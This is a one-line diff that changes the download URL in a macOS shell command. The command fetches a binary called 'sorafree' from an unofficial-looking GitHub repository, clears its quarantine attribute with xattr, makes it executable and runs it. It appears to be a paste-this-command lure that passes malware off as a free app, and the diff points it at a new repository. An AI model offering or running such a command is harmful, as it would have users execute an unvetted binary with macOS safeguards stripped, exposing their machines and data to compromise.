@@ -1,1 +1,1 @@
-cd $TMPDIR && curl -O https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/sorafree && xattr -c sorafree  && chmod +x sorafree  && ./sorafree
+cd $TMPDIR && curl -O https://raw.githubusercontent.com/macos-sora/sora/refs/heads/main/sorafree && xattr -c sorafree  && chmod +x sorafree  && ./sorafree
